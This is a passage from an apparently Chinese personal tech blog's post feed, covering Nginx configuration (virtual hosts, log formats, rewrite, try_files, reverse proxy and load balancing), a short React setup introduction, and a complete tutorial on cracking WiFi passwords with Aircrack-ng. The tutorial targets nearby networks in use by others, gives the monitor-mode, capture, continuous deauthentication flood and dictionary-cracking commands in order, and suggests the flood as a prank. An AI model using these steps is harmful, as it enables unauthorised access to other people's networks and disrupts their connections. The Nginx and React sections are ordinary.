class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    proxy_pass   http://127.0.0.1;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    root           html;</span></span><br><span class="line">        <span class="comment">#    fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment">#    fastcgi_index  index.php;</span></span><br><span class="line">        <span class="comment">#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span></span><br><span class="line">        <span class="comment">#    include        fastcgi_params;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># deny access to .htaccess files, if Apache's document root</span></span><br><span class="line">        <span class="comment"># concurs with nginx's one</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">        <span class="comment">#    deny  all;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># another virtual host using mix of IP-, name-, and port-based configuration</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       8000;</span></span><br><span class="line">    <span class="comment">#    listen       somename:8080;</span></span><br><span class="line">    <span class="comment">#    server_name  somename  alias  another.alias;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># HTTPS server</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       443 ssl;</span></span><br><span class="line">    <span class="comment">#    server_name  localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_certificate      cert.pem;</span></span><br><span class="line">    <span class="comment">#    ssl_certificate_key  cert.key;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_session_cache    shared:SSL:1m;</span></span><br><span class="line">    <span class="comment">#    ssl_session_timeout  5m;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span></span><br><span class="line">    <span class="comment">#    ssl_prefer_server_ciphers  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nginx配置虚拟主机"><a href="#Nginx配置虚拟主机" class="headerlink" title="Nginx配置虚拟主机"></a>Nginx配置虚拟主机</h2><p>例1:基于域名的虚拟主机</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>; <span class="comment"># 监听端口</span></span><br><span class="line">    <span class="attribute">server_name</span>  somename  alias  another.alias; <span class="comment"># 监听域名，如有多个，空格隔开</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   /var/www/website; <span class="comment"># 根目录定位</span></span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm; <span class="comment"># 默认索引页</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2:Apache的虚拟主机配置</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost 192.168.137.201:80&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">"/var/www/website"</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">ServerName</span></span>    www.website.com</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>例3: 基于端口的虚拟主机配置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">8080</span>; <span class="comment"># 监听端口</span></span><br><span class="line">    <span class="attribute">server_name</span>  springbook.cn;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   /var/www/website; <span class="comment"># 根目录定位</span></span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm; <span class="comment"># 默认索引页</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h2><p>我们观察Nginx的server段可以看到如下类似信息<br>access_log logs/access.log main;</p><p>这说明该server，它的访问日志的文件是logs/host、access.log,<br>日志格式”main”格式</p><p>main格式是什么</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">#log_format  main  <span class="string">'<span class="subst">$remote_addr</span> - <span class="subst">$remote_user</span> [<span class="subst">$time_local</span>] "<span class="subst">$request</span>" '</span></span><br><span class="line">#                  <span class="string">'<span class="subst">$status</span> <span class="subst">$body_bytes_sent</span> "<span class="subst">$http_referer</span>" '</span></span><br><span class="line">#                  <span class="string">'"<span class="subst">$http_user_agent</span>" "<span class="subst">$http_x_forwarded_for</span>"'</span>;</span><br><span class="line"></span><br><span class="line">#access_log  logs/access.log  main;</span><br></pre></td></tr></table></figure><p>除了main格式，你可以自定义其它格式</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">log_format</span>  mylog  <span class="string">'<span class="variable">$remote_addr</span>  [<span class="variable">$time_local</span>] "<span class="variable">$request</span>" '</span></span><br><span class="line">                  <span class="string">'<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> "<span class="variable">$http_referer</span>" '</span></span><br><span class="line">                  <span class="string">'"<span class="variable">$http_user_agent</span>"'</span>;</span><br></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 下面声明a.com使用mylog格式日志，并保存在logs/a.com.log文件中</span></span><br><span class="line">    access_log logs/a.com.<span class="built_in">log</span> mylog;</span><br><span class="line">    server_name  springbook.cn;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main格式是我们定义好一种日志的格式，并起个名字，便于引用。以上面的例子，main类型的日志记录的remote_addr···http_x_forwarded_for等选项。</p><p>日志格式:是指记录哪些选项<br>默认的日志格式: main</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">#log_format  main  <span class="string">'<span class="subst">$remote_addr</span> - <span class="subst">$remote_user</span> [<span class="subst">$time_local</span>] "<span class="subst">$request</span>" '</span></span><br><span class="line">#                  <span class="string">'<span class="subst">$status</span> <span class="subst">$body_bytes_sent</span> "<span class="subst">$http_referer</span>" '</span></span><br><span class="line">#                  <span class="string">'"<span class="subst">$http_user_agent</span>" "<span class="subst">$http_x_forwarded_for</span>"'</span>;</span><br></pre></td></tr></table></figure><p>如默认的main日志格式,记录这么几项<br>远程IP 远程用户 用户时间 请求方法(如GET/POST) 请求体长度 referer来源信息 http-user-agent 用户代理/蜘蛛，被转发的请求的原始IP http_x_forwarded_for在经过代理时，代理把你的本来IP加在此头信息中，传输你的原始IP。<br>实际应用: Shell+定时任务+Nginx信号管理，完成日志按日期存储。</p><h2 id="PHP配置移植"><a href="#PHP配置移植" class="headerlink" title="PHP配置移植"></a>PHP配置移植</h2><p>略</p><h2 id="pathinfo支持"><a href="#pathinfo支持" class="headerlink" title="pathinfo支持"></a>pathinfo支持</h2><p>pathinfo类似于java开发中的restful风格</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">典型配置</span><br><span class="line"><span class="keyword">location</span> <span class="title">~ \.php</span>$ &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改1,5,6行，支持pathinfo</span></span><br><span class="line"><span class="keyword">location</span> <span class="title">~ \.php</span>(.*) &#123; <span class="comment"># 正则匹配，php前后的script_name和pathinfo部分</span></span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  PATH_<span class="literal">INF</span>O $<span class="number">1</span>; <span class="comment"># 把pathinfo部分赋值给PATH_INFO变量</span></span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nginx与Rewrite规则"><a href="#Nginx与Rewrite规则" class="headerlink" title="Nginx与Rewrite规则"></a>Nginx与Rewrite规则</h2><p>Rewrite语法<br>Rewrite正则表达式 定向后的位置 模式<br>Goods-3.html ——&gt; Goods.php?goods_id=$1</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">goods-([\d+])\.html ---&gt; goods.php?<span class="attribute">goods_id</span>=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">	index index.php</span><br><span class="line">	rewrite goods-([\d]+)\.html$ /ecshop/goods.php?<span class="attribute">id</span>=<span class="variable">$1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意:用url重写时，正则里如果有“{}”，正则要用双引号包起来。</p><h2 id="try-files"><a href="#try-files" class="headerlink" title="try_files"></a>try_files</h2><p>当用户请求 <a href="http://localhost/example" target="_blank" rel="noopener">http://localhost/example</a> 时，这里的 $uri 就是 /example。<br>try_files 会到硬盘里尝试找这个文件。如果存在名为 /$root/example（其中 $root 是项目代码安装目录）的文件，就直接把这个文件的内容发送给用户。<br>显然，目录中没有叫 example 的文件。然后就看 $uri/，增加了一个 /，也就是看有没有名为 /$root/example/ 的目录。<br>又找不到，就会 fall back 到 try_files 的最后一个选项 /index.php，发起一个内部 “子请求”，也就是相当于 nginx 发起一个 HTTP 请求到 <a href="http://localhost/index.php。" target="_blank" rel="noopener">http://localhost/index.php。</a></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">	<span class="attribute">try_files</span> <span class="variable">$uri</span> /index.php?<span class="variable">$uri</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_files方法让Ngxin尝试访问后面得$uri链接，并进根据@apache配置进行内部重定向。</p><p>当然try_files也可以以错误代码赋值，如try_files /index.php = 404 @apache，则表示当尝试访问得文件返回404时，根据@apache配置项进行重定向。</p>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>第3章 Nginx优化</title>
    <url>/Nginx/966c5443.html</url>
    <content><![CDATA[<h2 id="Nginx反向代理与动静分离"><a href="#Nginx反向代理与动静分离" class="headerlink" title="Nginx反向代理与动静分离"></a>Nginx反向代理与动静分离</h2><p>用nginx做反向代理用proxy_pass,以反向代理为例，nginx不自己处理图片的相关请求，而是把图片的请求转发给apache来处理。<br><img src="/images/nginx/04.png" alt="Nginx"><br>—这就是传说的“动静分离”，动静分离不是一个严谨的说法，叫反向代理比较规范。<br>配置如下:</p><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">location ~ \.(jpg|<span class="type">jpeg</span>|<span class="type">png</span>|<span class="type">gif</span>)$ &#123;</span><br><span class="line">	proxy_pass HTTP://IP:PORT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思考:</p><ol><li><p>反向代理导致了后端服务器接到的客户端IP为前端服务器的IP，而不是客户真正的IP，怎么办?<br>答: 代理服务器通过设置头信息字段，把用户的IP传递到后台服务器去。<br>如:</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.(jpg|jpeg|png|gif)$</span> &#123;</span><br><span class="line">	<span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$remote_addr</span>;</span><br><span class="line">	<span class="attribute">proxy_pass</span> HTTP://IP:PORT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在apache的日志格式里加上X-Forwarded-For,如下:</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">LogFormat <span class="string">"%&#123;X-Forwarded-For&#125;i %l %u \"%r\" %&gt;s %b"</span> common</span><br></pre></td></tr></table></figure></li><li><p>如果后端的服务器非常多，该如何写？又如何均匀的分发任务?（负载均衡）</p></li></ol><h2 id="Nginx集群和负载均衡"><a href="#Nginx集群和负载均衡" class="headerlink" title="Nginx集群和负载均衡"></a>Nginx集群和负载均衡</h2><p>具体的负载均衡的方式<br>注意:负载均衡是一种方案，实现办法有DNS轮询。<br>如下图，DNS服务器允许一个域名有多个A记录。那么在用户访问时，一般按地域返回一个较近的解析记录。这样，全国不同的地区，看到的163的主页，来自不同的服务器。<br><img src="/images/nginx/05.png" alt="Nginx"></p><p>第二步:当解析出结果，比如浏览器连接60.217时，这台主机后面还有N台，也要做负载均衡。<br>1) 硬件上做负载均衡，F5 BIG-IP，硬件负载均衡(很贵)直接从TCP/IP的底层协议上，直接做数据包的中转。<br>2) 软件负载均衡,LVS<br>3) 反向代理+负载均衡<br>在nignx中做集群与负载均衡步骤都是一样的，Upstream{}模块把多台服务器加入到一个组，然后memcached_pass，fastcgi_pass, proxy_pass ==&gt; upstream组<br>具体配置步骤:<br>配置upstream</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">upstream imageserver &#123;</span><br><span class="line"><span class="built_in">	server </span>192.168.1.204:8080 <span class="attribute">weight</span>=1 <span class="attribute">max_fails</span>=2 <span class="attribute">fail_timeout</span>=30s;</span><br><span class="line"><span class="built_in">	server </span>192.168.1.204:8081 <span class="attribute">weight</span>=1 <span class="attribute">max_fails</span>=2 <span class="attribute">fail_timeout</span>=30s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下游调用:</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.(jpg|jpeg|png|gif)$</span> &#123;</span><br><span class="line">	<span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$remote_addr</span>;</span><br><span class="line">	<span class="attribute">proxy_pass</span> http://imageserver;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认的负载均衡算的算法:<br>是设置计数器，轮流请求N台服务器</p><p>可以按照第3中模式，来利用不同参数把请求均衡到不同服务器去，<br>如基于cookie值区别用户做负载均衡(nginx sticky模块)，<br>或基于URI利用一致性哈希算法做均衡(NginxHttpUpstreamConsistentHash模块)<br>或基于IP做负载均衡等。</p>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>第1章 React新的前端思维方式</title>
    <url>/%E5%89%8D%E7%AB%AF/React/e0be4b8d.html</url>
    <content><![CDATA[<h2 id="初始化一个React项目"><a href="#初始化一个React项目" class="headerlink" title="初始化一个React项目"></a>初始化一个React项目</h2><p>为了开发React应用，你的电脑是运行微软Windows操作系统，还是苹果Mac，或者是Linux，并不重要，只需要保证具备以下条件：</p><p>安装了浏览器，如果是Windows操作系统，请保证微软IE浏览器版本不低于8.0版，因为React不支持比IE8更低版本的浏览器；<br>有一个命令运行环境，在Windows操作系统中有命令行界面，在苹果Mac电脑中可以使用Terminal应用，对于Linux用户，命令行环境我想不用过多解释;<br>一个你最喜欢的代码编辑器，用于编辑React应用的代码，只有实际编码才能有深入体会。</p><p>作为开发者，推荐使用谷歌Chrome浏览器，因为Chrome浏览器自带的开发辅助工具非常友好，而且还可以安装辅助React和Redux的扩展工具。</p><p>React是一个JavaScript语言的工具库，在这个JavaScript工具铺天盖地的时代，没有意外，你需要安装Node.js，React本身并不依赖于Node.js，但是我们开发中用到的诸多工具需要Node.js的支持。</p><p>在Node.js的官网<a href="https://nodejs.org/" title="Node.js" target="_blank" rel="noopener">(https://nodejs.org/)</a>可以找到合适的安装方式，安装Node.js的同时也就安装了npm，npm是Node.js的安装包管理工具，因为我们不可能自己开发所有功能，会大量使用现有的安装包，就需要npm的帮助。</p>]]></content>
      <categories>
        <category>前端</category>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下使用Aircrack-ng破解WiFi密码</title>
    <url>/%E5%85%B6%E5%AE%83/WIFI/f4101695.html</url>
    <content><![CDATA[<h2 id="暴力破解概述"><a href="#暴力破解概述" class="headerlink" title="暴力破解概述"></a>暴力破解概述</h2><p>1：穷举法是一种针对于密码的破译方法。这种方法很像数学上的“完全归纳法”并在密码破译方面得到了广泛的应用。简单来说就是将密码进行逐个推算直到找出真正的密码为止。比如一个四位并且全部由数字组成其密码共有10000种组合，也就是说最多我们会尝试9999次才能找到真正的密码。利用这种方法我们可以运用计算机来进行逐个推算，也就是说用我们破解任何一个密码也都只是一个时间问题<br>2：当然如果破译一个有8位而且有可能拥有大小写字母、数字、以及符号的密码用普通的家用电脑可能会用掉几个月甚至更多的时间去计算，其组合方法可能有几千万亿种组合。这样长的时间显然是不能接受的。其解决办法就是运用字典，所谓“字典”就是给密码锁定某个范围，比如英文单词以及生日的数字组合等，所有的英文单词不过10万个左右这样可以大大缩小密码范围，很大程度上缩短了破译时间</p><h2 id="使用环境："><a href="#使用环境：" class="headerlink" title="使用环境："></a>使用环境：</h2><p>1：使用linux系统操作<br>2：周围有wifi<br>3：你要攻击的wifi有人在使用（即至少有一个人正在连着该wifi）</p><h2 id="破解wifi密码操作步骤"><a href="#破解wifi密码操作步骤" class="headerlink" title="破解wifi密码操作步骤"></a>破解wifi密码操作步骤</h2><p>1： 通过aircrack-ng 工具，将网卡改为监听模式<br>2 ：确定目标WiFi 的信息，比如mac 地址和信道，连接数等等<br>3 ：模拟无线，抓取密码信息<br>4：确定目标用户，对其发动攻击<br>5：得到加密的无线信息并进行破解(通过密码字典)<br>步骤就是这样了，接下来我来破解下附近的WiFi</p><h2 id="WiFi密码破解步骤演示"><a href="#WiFi密码破解步骤演示" class="headerlink" title="WiFi密码破解步骤演示"></a>WiFi密码破解步骤演示</h2><h3 id="1：使用ifconfig查询ip无线网卡名称（一般是wlan0，我的是wlp3s0）"><a href="#1：使用ifconfig查询ip无线网卡名称（一般是wlan0，我的是wlp3s0）" class="headerlink" title="1：使用ifconfig查询ip无线网卡名称（一般是wlan0，我的是wlp3s0）"></a>1：使用ifconfig查询ip无线网卡名称（一般是wlan0，我的是wlp3s0）</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">[caifenglin@caifenglin-super</span> <span class="string">~]$</span> <span class="string">ifconfig</span></span><br><span class="line"><span class="attr">enp0s31f6:</span> <span class="string">flags=4099&lt;UP,BROADCAST,MULTICAST&gt;</span>  <span class="string">mtu</span> <span class="number">1500</span></span><br><span class="line">        <span class="string">ether</span> <span class="number">54</span><span class="string">:e1:ad:4c:be:a5</span>  <span class="string">txqueuelen</span> <span class="number">1000</span>  <span class="string">(Ethernet)</span></span><br><span class="line">        <span class="string">RX</span> <span class="string">packets</span> <span class="number">0</span>  <span class="string">bytes</span> <span class="number">0</span> <span class="string">(0.0</span> <span class="string">B)</span></span><br><span class="line">        <span class="string">RX</span> <span class="string">errors</span> <span class="number">0</span>  <span class="string">dropped</span> <span class="number">0</span>  <span class="string">overruns</span> <span class="number">0</span>  <span class="string">frame</span> <span class="number">0</span></span><br><span class="line">        <span class="string">TX</span> <span class="string">packets</span> <span class="number">0</span>  <span class="string">bytes</span> <span class="number">0</span> <span class="string">(0.0</span> <span class="string">B)</span></span><br><span class="line">        <span class="string">TX</span> <span class="string">errors</span> <span class="number">0</span>  <span class="string">dropped</span> <span class="number">0</span> <span class="string">overruns</span> <span class="number">0</span>  <span class="string">carrier</span> <span class="number">0</span>  <span class="string">collisions</span> <span class="number">0</span></span><br><span class="line">        <span class="string">device</span> <span class="string">interrupt</span> <span class="number">16</span>  <span class="string">memory</span> <span class="number">0xe1300000</span><span class="string">-e1320000</span>  </span><br><span class="line"></span><br><span class="line"><span class="attr">lo:</span> <span class="string">flags=73&lt;UP,LOOPBACK,RUNNING&gt;</span>  <span class="string">mtu</span> <span class="number">65536</span></span><br><span class="line">        <span class="string">inet</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  <span class="string">netmask</span> <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        <span class="string">inet6</span> <span class="string">::1</span>  <span class="string">prefixlen</span> <span class="number">128</span>  <span class="string">scopeid</span> <span class="number">0x10</span><span class="string">&lt;host&gt;</span></span><br><span class="line">        <span class="string">loop</span>  <span class="string">txqueuelen</span> <span class="number">1000</span>  <span class="string">(Local</span> <span class="string">Loopback)</span></span><br><span class="line">        <span class="string">RX</span> <span class="string">packets</span> <span class="number">87972</span>  <span class="string">bytes</span> <span class="number">202035327</span> <span class="string">(192.6</span> <span class="string">MiB)</span></span><br><span class="line">        <span class="string">RX</span> <span class="string">errors</span> <span class="number">0</span>  <span class="string">dropped</span> <span class="number">0</span>  <span class="string">overruns</span> <span class="number">0</span>  <span class="string">frame</span> <span class="number">0</span></span><br><span class="line">        <span class="string">TX</span> <span class="string">packets</span> <span class="number">87972</span>  <span class="string">bytes</span> <span class="number">202035327</span> <span class="string">(192.6</span> <span class="string">MiB)</span></span><br><span class="line">        <span class="string">TX</span> <span class="string">errors</span> <span class="number">0</span>  <span class="string">dropped</span> <span class="number">0</span> <span class="string">overruns</span> <span class="number">0</span>  <span class="string">carrier</span> <span class="number">0</span>  <span class="string">collisions</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">wlp3s0:</span> <span class="string">flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;</span>  <span class="string">mtu</span> <span class="number">1500</span></span><br><span class="line">        <span class="string">inet</span> <span class="number">192.168</span><span class="number">.43</span><span class="number">.115</span>  <span class="string">netmask</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="string">broadcast</span> <span class="number">192.168</span><span class="number">.43</span><span class="number">.255</span></span><br><span class="line">        <span class="string">inet6</span> <span class="string">fe80::784d:9497:1275:4b89</span>  <span class="string">prefixlen</span> <span class="number">64</span>  <span class="string">scopeid</span> <span class="number">0x20</span><span class="string">&lt;link&gt;</span></span><br><span class="line">        <span class="string">ether</span> <span class="string">cc:2f:71:9f:dd:78</span>  <span class="string">txqueuelen</span> <span class="number">1000</span>  <span class="string">(Ethernet)</span></span><br><span class="line">        <span class="string">RX</span> <span class="string">packets</span> <span class="number">472508</span>  <span class="string">bytes</span> <span class="number">567343526</span> <span class="string">(541.0</span> <span class="string">MiB)</span></span><br><span class="line">        <span class="string">RX</span> <span class="string">errors</span> <span class="number">0</span>  <span class="string">dropped</span> <span class="number">0</span>  <span class="string">overruns</span> <span class="number">0</span>  <span class="string">frame</span> <span class="number">0</span></span><br><span class="line">        <span class="string">TX</span> <span class="string">packets</span> <span class="number">245806</span>  <span class="string">bytes</span> <span class="number">34910387</span> <span class="string">(33.2</span> <span class="string">MiB)</span></span><br><span class="line">        <span class="string">TX</span> <span class="string">errors</span> <span class="number">0</span>  <span class="string">dropped</span> <span class="number">0</span> <span class="string">overruns</span> <span class="number">0</span>  <span class="string">carrier</span> <span class="number">0</span>  <span class="string">collisions</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="2-开启无线网卡的监听模式"><a href="#2-开启无线网卡的监听模式" class="headerlink" title="2:开启无线网卡的监听模式"></a>2:开启无线网卡的监听模式</h3><blockquote><p>sudo airmon-ng start wlp3s0</p></blockquote><p>如图所示，网卡名称可能会发生改变（增加了mon），此时为监听模式，注意：此时电脑无法连接wifi，如果发现电脑设置里面无线连接消失了，是正常的，破解完wifi密码后，关闭监听模式无线连接就重新出现了<br><img src="/images/wifi/wifi001.png" alt="wifi"></p><h3 id="3：扫描目标WiFi"><a href="#3：扫描目标WiFi" class="headerlink" title="3：扫描目标WiFi"></a>3：扫描目标WiFi</h3><blockquote><p>sudo airodump-ng wlp3s0mon<br><img src="/images/wifi/wifi002.png" alt="wifi"></p></blockquote><p>Data当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。<br>经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Data的那列，所以选择攻击的wifi最好先从Data看起来，选择一个有数据（数据越大越好）的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。</p><p>现在我们要确认一些信息，及目标AP（就是WiFi，以下简称AP） 的MAC 地址，AP 的信道和加密方式：<br>BSSID：目标AP的MAC地址（WiFi路由器的） 图中蓝色框<br>CH（信道）：1 图中黄色框<br>加密方式：WPA2<br>我们只需要这些信息就足够了</p><h3 id="4：模拟WiFi-信号抓包"><a href="#4：模拟WiFi-信号抓包" class="headerlink" title="4：模拟WiFi 信号抓包"></a>4：模拟WiFi 信号抓包</h3><blockquote><p>sudo airodump-ng –ivs -c 1 –bssid 74:F8:DB:62:1C:1D -w /work/wifi/wifipackage wlp3s0mon</p></blockquote><p>–ivs ：指定生成文件的格式，这里格式是ivs（比如：hahaha.ivs）<br>-w ：指定文件的名称叫什么，这里叫wifipackage<br>–bssid ：目标AP的MAC地址<br>-c ：指定我们模拟的WiFi的信道，这里是1<br><img src="/images/wifi/wifi003.png" alt="wifi"></p><h3 id="5-进行洪水攻击，保持上面的窗口不要关闭，重新开一个窗口输入命令"><a href="#5-进行洪水攻击，保持上面的窗口不要关闭，重新开一个窗口输入命令" class="headerlink" title="5:进行洪水攻击，保持上面的窗口不要关闭，重新开一个窗口输入命令"></a>5:进行洪水攻击，保持上面的窗口不要关闭，重新开一个窗口输入命令</h3><blockquote><p>sudo aireplay-ng -0 0 -a 74:F8:DB:62:1C:1D wlp3s0mon<br>0 表示不断攻击 ，这个命令也可以理解为：让当前路由下的所有连接断开，要是搞恶作剧的话你可以试试哈<br><img src="/images/wifi/wifi004.png" alt="wifi"></p></blockquote><p>注意黄色框的位置，如果在发送攻击数据包之后出现了黄色框的信息，那么就是密码信息抓取成功了，如果出现了这个的话就可以结束WiFi 模拟了，我们可以按Ctrl+C 然后查看我们指定的目录会发现多了一个wifipackage-01.ivs文件，我们想要的密码就在这个文件里，不过是加密的，所有我们还需要通过密码字典把密码破解出来</p><p>注：1：如果一直不出现，就再换一个wifi攻击，尽量挑选Data值高的攻击，如果Data为0，不可能成功。 2：有的时候会报下图这种错误，我也不知道为什么，多执行几次就好了。如果有知道的，可以留言给我，谢谢</p><h3 id="6：指定密码本来破解此文件"><a href="#6：指定密码本来破解此文件" class="headerlink" title="6：指定密码本来破解此文件"></a>6：指定密码本来破解此文件</h3><blockquote><p>sudo aircrack-ng -w /work/wifi/password.txt /work/wifi/wifipackage.ivs<br>/work/wifi/password.txt ：是密码本路径<br>/work/wifi/wifipackage.ivs：是抓取的包<br>注意：如果wifi密码很复杂，比如数字字母特殊字符都有，可能需要破解很长时间，甚至破解不出来，跟字典也有关系，不过一般来说，谁家密码那么复杂，根据我个人使用，大部分都可以破解，但是带特殊字符的基本上破解不了，纯数字的几秒就破解了，字母加数字的一般也都能破解，只是要花点时间。。。<br><img src="/images/wifi/wifi005.png" alt="wifi"><br>这里看到红色箭头的位置就是密码了，到这里密码破解就完成了~</p></blockquote><h3 id="7-关闭监听模式连接wifi"><a href="#7-关闭监听模式连接wifi" class="headerlink" title="7:关闭监听模式连接wifi"></a>7:关闭监听模式连接wifi</h3><blockquote><p>sudo airmon-ng stop wlp3s0mon</p></blockquote>]]></content>
      <categories>
        <category>其它</category>
        <category>WIFI</category>
      </categories>
      <tags>
        <tag>WIFI</tag>
      </tags>
  </entry>
  <entry>
    <title>Frp实现内网穿透</title>
    <url>/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/62d5dc2c.html</url>
